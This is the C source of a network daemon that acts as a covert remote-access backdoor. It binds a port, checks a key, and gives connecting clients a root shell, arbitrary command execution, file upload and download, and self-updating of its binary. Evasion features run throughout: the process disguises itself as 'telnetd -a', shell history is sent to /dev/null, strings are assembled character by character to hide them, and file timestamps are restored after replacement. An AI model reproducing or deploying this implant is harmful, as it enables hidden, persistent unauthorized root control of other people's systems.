/*
 * Copyright (C) 2014 Qian Shanhai (qianshanhai@gmail.com)
 */
#include "common.h"

static char **_argv = NULL;
static char save_argv[128];
static char save_argv_tmp[128];

void sig_SIGXCPU(int sig)
{
	exit(0);
}

void _cfmakeraw(struct termios *p)
{
	p->c_cc[VMIN] = 1;
	p->c_cc[VTIME] = 0;
	p->c_cc[VLNEXT] = Ctrl('V');
	p->c_cc[VEOF] = Ctrl('D');
	p->c_cc[VEOL2] = Ctrl('@');

	p->c_iflag &= ~(IGNBRK | IGNCR | PARMRK | ISTRIP | IXOFF);
	p->c_iflag |= (IXON | BRKINT | IGNPAR);
#ifdef IMAXBEL
	p->c_iflag |= IMAXBEL;
#endif

	p->c_oflag |= OPOST;
	/* p->c_lflag &= ~(ECHO | ECHONL | ICANON | ISIG | IEXTEN); */
	p->c_lflag &= ~(ECHONL);
	p->c_lflag |= ISIG | ICANON;

	p->c_cflag &= ~(CSIZE|PARENB);
	p->c_cflag |= CS8;
}

void fixtty(int fd)
{
	struct termios newtty;

	tcgetattr(fd, &origtty);
	memcpy(&newtty, &origtty, sizeof(newtty));

	_cfmakeraw(&newtty);

	cfsetispeed(&newtty, B38400);
	cfsetospeed(&newtty, B38400);

	tcsetattr(fd, TCSANOW, &newtty);

	ioctl(fd, TIOCSWINSZ, (char *)&win);
}


#ifdef _AIX
#define CLONE_PTY_FILE "/dev/ptc"
#else
#define CLONE_PTY_FILE "/dev/ptmx"
#endif

int my_grantpt(int fd)
#ifdef __linux__
{
	grantpt(fd);

	return 0;
}
#else
{
	char *name;

	name = ptsname(fd);

	chmod(name, S_IRUSR | S_IWUSR | S_IWGRP);

	return 0;
}
#endif

int my_unlockpt(int fd)
#ifdef __linux__
{
	return unlockpt(fd);
}
#else
{
	return 0;
}
#endif

int ptyopen(void (*func)(int fd))
{
	char *p;
	pid_t pid;
	char *slavename;
	int fd, slave;

	setsid();

	if ((master = open(CLONE_PTY_FILE, O_RDWR | O_NOCTTY)) == -1) {
		return -1;
	}

	if (my_grantpt(master) == -1) {
		close(master);
		return -1;
	}

	if (my_unlockpt(master) == -1) {
		close(master);
		return -1;
	}
	fixtty(master);

	if ((pid = fork()) == -1) {
		close(master);
		return -1;
	}

	if (pid == 0) {
		setsid();
		if ((slavename = ptsname(master)) == NULL) {
			close(master);
			exit(1);
		}
		if ((slave = open(slavename, O_RDWR | O_NOCTTY)) < 0) {
			close(master);
			exit(1);
		}
		fixtty(slave);

		setsid();

#ifdef TIOCSCTTY
		ioctl(slave, TIOCSCTTY, NULL);
#endif
		func(slave);
	}

	return pid;
}

static char *shell = "/bin/sh";

static char *_shell[] = {
	"/usr/bin/bash",
	"/bin/bash",
	"/bin/sh",
	NULL
};

void get_shell()
{
	int i;

	for (i = 0; _shell[i]; i++) {
		if (dashf(_shell[i]) && dashx(_shell[i])) {
			shell = _shell[i];
			return;
		}
	}
}

void do_shell(int fd);

void doit(int fd, void (*func)(int fd))
{
	int i, pid, n, other_pid;

	_daemon(0);

	if (func == NULL)
		return;

	for (i = 1; i < 64; i++) {
		my_signal(i, SIG_IGN);
	}

	set_default_signal();

	get_shell();

	if ((pid = ptyopen(func)) == -1)
		exit(1);

	sock_fd = fd;
	sock_in = master;
	sock_out = master;

	my_signal(SIGCHLD, sig_chld);

	loop(pid);

	kill(pid, SIGQUIT);
	kill(pid, SIGKILL);
}

void my_setenv()
{
	char term[32], vt100[32], hist[32], null[32], ps1[32], crypt[32];

	term[0] = 'T';
	term[1] = 'E';
	term[2] = 'R';
	term[3] = 'M';
	term[4] = 0;

	vt100[0] = 'v';
	vt100[1] = 't';
	vt100[2] = '1';
	vt100[3] = '0';
	vt100[4] = '0';
	vt100[5] = 0;

	hist[0] = 'H';
	hist[1] = 'I';
	hist[2] = 'S';
	hist[3] = 'T';
	hist[4] = 'F';
	hist[5] = 'I';
	hist[6] = 'L';
	hist[7] = 'E';
	hist[8] = 0;

	null[0] = '/';
	null[1] = 'd';
	null[2] = 'e';
	null[3] = 'v';
	null[4] = '/';
	null[5] = 'n';
	null[6] = 'u';
	null[7] = 'l';
	null[8] = 'l';
	null[9] = 0;

	ps1[0] = 'P';
	ps1[1] = 'S';
	ps1[2] = '1';
	ps1[3] = 0;

	crypt[0] = '[';
	crypt[1] = 'q';
	crypt[2] = 's';
	crypt[3] = 'h';
	crypt[4] = ']';
	crypt[5] = '\\';
	crypt[6] = '$';
	crypt[7] = ' ';
	crypt[8] = 0;

	setenv(term, vt100, 1);
	setenv(hist, null, 1);
	setenv(ps1, crypt, 1);
}

void do_shell(int fd)
{
	int i;
	char *p, *args[3];

	set_default_signal();

	my_setrlimit(120, 150);
	my_signal(SIGXCPU, sig_SIGXCPU);

	if ((p = strrchr(shell, '/')))
		p++;
	else
		p = (char *)shell;

	args[0] = p;
	args[1] = NULL;
	args[2] = NULL;

	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);

	if (fd > 2)
		close(fd);

	my_setenv();

	chdir("/tmp");

	execv(shell, args);
	execv("/bin/sh", args);
	perror(shell);

	exit(1);
}

int do_update(int fd)
{
	int n, t, len = 0;
	char *p, *buf = __buf;
	unsigned char *msg = __msg;
	struct stat st;
	struct utimbuf timbuf;

	if ((n = read_data(fd, buf, PUT_LEN + HEAD_LEN)) <= 0)
		return -1;

	if ((t = unpack(msg, buf, n)) <= 0)
		return -1;

	msg[t] = 0;
	chomp((char *)msg);
	len = atoi((char *)msg);

	if (get_file(save_argv_tmp, fd) == -1)
		return -1;

	if (len == 0 || len != filesize(save_argv_tmp)) {
		unlink(save_argv_tmp);
		return -1;
	}
	if (stat(save_argv, &st) == -1) {
		unlink(save_argv_tmp);
		return -1;
	}
	timbuf.actime = st.st_atime;
	timbuf.modtime = st.st_mtime;

	if (unlink(save_argv) == -1)
		return -1;

	if (rename(save_argv_tmp, save_argv) == -1)
		return -1;

	if (chmod(save_argv, 0750) == -1)
		return -1;

	chown(save_argv, 0, 0);

	utime(save_argv, &timbuf);

	if ((p = strrchr(save_argv_tmp, '/'))) {
		*p = 0;
		utime(save_argv_tmp, &timbuf);
	}

	return 0;
}

void do_update_ok()
{
	char *args[3];

	args[0] = save_argv;
	args[1] = args[2] = NULL;

	execv(save_argv, args);
	exit(0);
}

void do_put(int fd)
{
	int t, n;
	char *p, fname[256], *buf = __buf;

	memset(fname, 0, sizeof(fname));

	if ((n = read_data(fd, buf, GET_LEN + HEAD_LEN)) > 0) {
		if ((t = unpack((unsigned char *)fname, buf, n)) > 0) {
			fname[t] = 0;
			chomp(fname);
			if (!(p = strchr(fname, PUT_PATH_CHAR)))
				return;
			*p = 0;
			if (dashd(fname))
				*p = '/';
			get_file(fname, fd);
		}
	}
	close(fd);
	exit(0);
}

void do_get(int fd)
{
	int t, n;
	char fname[256], *buf = __buf;

	memset(fname, 0, sizeof(fname));

	if ((n = read_data(fd, buf, GET_LEN + HEAD_LEN)) > 0) {
		if ((t = unpack((unsigned char *)fname, buf, n)) > 0) {
			fname[t] = 0;
			chomp(fname);
			put_file(fname, fd);
		}
	}
	close(fd);
	exit(0);
}

void do_cmd(int sock)
{
	int n, t, pid, fd[2];
	char cmd[160], *buf = __buf, tmp[12];
	unsigned char *msg = __msg;

	if ((n = read_data(sock, buf, GET_LEN + HEAD_LEN)) <= 0)
		return;
	if ((t = unpack((unsigned char *)cmd, buf, n)) <= 0)
		return;
	cmd[t] = 0;
	chomp(cmd);

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, fd) == -1)
		return;

	set_default_signal();

	if ((pid = fork()) == 0) {
		char *arg[4];
		close(fd[0]);
		set_default_signal();

		dup2(fd[1], 0);
		dup2(fd[1], 1);
		dup2(fd[1], 2);

		if (fd[1] > 2)
			close(fd[1]);

		arg[0] = "/bin/sh";
		arg[1] = "-c";
		arg[2] = cmd;
		arg[3] = NULL;

		execv(arg[0], arg);
		exit(0);
	}
	close(fd[1]);

	while ((n = _read_data(sock, buf, GET_LEN + HEAD_LEN, CMD_TO1)) > 0) {
		if ((t = unpack(msg, buf, n)) > 0) {
			write(fd[0], msg, t);
#ifdef SEND_DEBUG
			write(sock, TRANS_STRING, TRANS_LEN);
#endif
		}
	}
	if ((t = unpack(msg, NULL, 0)) > 0) {
		write(fd[0], msg, t);
#ifdef SEND_DEBUG
		write(sock, TRANS_STRING, TRANS_LEN);
#endif
	}

	while ((n = _read_data(fd[0], buf, GET_LEN, 2000000)) > 0) {
		if ((t = pack(msg, buf, n)) > 0) {
			write(sock, msg, t);
#ifdef SEND_DEBUG
			n = read_data_quick(sock, tmp, TRANS_LEN);
#endif
		}
	}
	close(fd[0]);

	exit(0);
}

static char _telnetd[32];

int my_exec(int fd, int cmd)
{
	struct sigaction sact;

	my_setrlimit(90, 120);
	my_signal(SIGXCPU, sig_SIGXCPU);

	_telnetd[0] = 't';
	_telnetd[1] = 'e';
	_telnetd[2] = 'l';
	_telnetd[3] = 'n';
	_telnetd[4] = 'e';
	_telnetd[5] = 't';
	_telnetd[6] = 'd';
	_telnetd[7] = ' ';
	_telnetd[8] = '-';
	_telnetd[9] = 'a';
	_telnetd[10] = 0;

	_argv[0] = _telnetd; /* just affect for AIX */
	_argv[1] = NULL;

	init_in_data();

	switch (cmd) {
		case ROOT_SHELL:
			doit(fd, do_shell);
			break;
		case ROOT_CMD:
			do_cmd(fd);
			break;
		case ROOT_GET:
			do_get(fd);
			break;
		case ROOT_PUT:
			do_put(fd);
			break;
		default:
			break;
	}
	close(fd);
	exit(0);
}

int wait_accept(int fd)
{
	int n;
	fd_set rmask;
	struct timeval tv;

	for (;;) {
		FD_ZERO(&rmask);
		FD_SET(fd, &rmask);

		tv.tv_sec = 3600;
		tv.tv_usec = 0;

		n = select(fd + 1, &rmask, NULL, NULL, &tv);
		if (n == -1) {
			if (errno == EINTR)
				continue;
			else
				return -1;
		} else if (n == 0)
			continue;

		if (FD_ISSET(fd, &rmask))
			return 0;
	}

	return -1;
}

int server()
{
	int  cmd = 0, on = 1, fd, connfd;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in  cliaddr, servaddr;
	char tmp[64];

	_daemon(1);

	my_srand(0);

	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return 1;

	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (char *) &on, sizeof(on));

	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family      = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port        = htons(_PORT);

	if (bind(fd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
		return 1;

	listen(fd, 5);

	my_signal(SIGCHLD, sig_chld);

	for (;;) {
		clilen = sizeof(cliaddr);

		if (wait_accept(fd) == -1)
			break;

		connfd = accept(fd, (struct sockaddr *) &cliaddr, &clilen);

		if (connfd == -1) {
			if (errno == EINTR) {
				sleep(1);
				continue;
			}
			break;
		}

		if (verify_recv(connfd) == -1) {
			close(connfd);
			continue;
		}
		if (read_data(connfd, tmp, 20) != 20) {
			close(connfd);
			continue;
		}
		winsize_unpack(&win, tmp);

		if (read_data(connfd, tmp, 4) != 4) {
			close(connfd);
			continue;
		}
		tmp[4] = 0;

		cmd = atoi(tmp);

		if (cmd == ROOT_UPDATE) {
			if (do_update(connfd) == 0) {
				close(fd);
				close(connfd);
				sleep(3);
				do_update_ok();
				exit(0);
			}
			close(connfd);
		}

		my_signal(SIGCHLD, sig_chld);

		if ((childpid = fork()) == 0) {
			close(fd);
			my_exec(connfd, cmd);
			exit(0);
		}
		close(connfd);
	}

	return 0;
}

char __p[32];

extern void __set_key(char *__p);

int main(int argc, char *argv[])
{
	setuid(0);
	setgid(0);

	memset(save_argv, 0, sizeof(save_argv));

	if (argv[0][0] != '/') {
		getcwd(save_argv, sizeof(save_argv));
		strcat(save_argv, "/");
	}
	strcat(save_argv, argv[0]);
	sprintf(save_argv_tmp, "%s.tmp.1", save_argv);

	_argv = argv; /* save */

	memset(__p, 0, sizeof(__p));

	init_in_data();

	__buf =(char *)malloc(ONCE_SIZE * MUL);
	__msg = (unsigned char *)malloc(ONCE_SIZE * MUL);

	__set_key(__p);

	passwd = __p;

	init_key(passwd, strlen(passwd));

	my_setrlimit(RLIM_INFINITY, RLIM_INFINITY);

	server();

	return 0;
}
